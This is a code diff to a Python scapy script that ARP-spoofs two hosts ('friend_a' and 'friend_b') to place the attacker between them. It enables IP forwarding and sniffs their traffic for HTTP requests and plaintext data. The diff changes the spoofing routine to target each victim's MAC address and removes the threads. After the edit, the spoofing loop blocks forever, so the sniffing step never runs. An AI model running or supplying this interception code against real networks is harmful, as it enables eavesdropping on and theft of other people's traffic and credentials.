@@ -1,5 +1,6 @@
 from scapy.all import ARP, Ether, send, sniff, conf, IP, getmacbyip
 import sys
+import scapy.all as scap
 import os
 import threading
 import html
@@ -26,12 +27,16 @@ def enable_ip_forwarding():
     print("[Done] IP Forwarding Enabled")
 
 
-def arp_spoof(victim_ip, target_ip):
-    """ Sends spoofed ARP packets to trick victim into thinking we are target """
-    packet = Ether() / ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)     # broadcasting the packet as we don't know the MAC of targets
-    # op = 2 means ARP reply
-    while True:
-        send(packet, verbose=False)
+def arp_spoof(friendA,macA, friendB, macB):
+    """ Sends spoofed ARP packets to trick victim into thinking we are target """    
+    try:
+        while True:
+            packet = scap.ARP(op=1, pdst=friendA, hwdst=macA, psrc=friendB)
+            scap.send(packet, verbose=False) 
+            packet = scap.ARP(op=1, pdst=friendB, hwdst=macB, psrc=friendA)
+            scap.send(packet, verbose=False) 
+    except KeyboardInterrupt:
+        print("Exiting Gracefully...")
     
 def sniff_packets(interface):
     """ Sniffs packets and logs HTTP requests & plaintext data """
@@ -51,15 +56,16 @@ def sniff_packets(interface):
 
 if __name__ == "__main__":
     friend_a = sys.argv[1]
-    friend_b = sys.argv[2]
-    interface = sys.argv[3]
+    friend_a_mac = sys.argv[2]
+    friend_b = sys.argv[3]
+    friend_b_mac = sys.argv[4]
+    interface = sys.argv[5]
 
 
     enable_ip_forwarding()
 
     # Start spoofing both victims simultaneously
-    threading.Thread(target=arp_spoof, args=(friend_a, friend_b)).start()
-    threading.Thread(target=arp_spoof, args=(friend_b, friend_a)).start()
+    arp_spoof(friend_a, friend_a_mac, friend_b, friend_b_mac)
 
     # Start sniffing the traffic
     sniff_packets(interface)
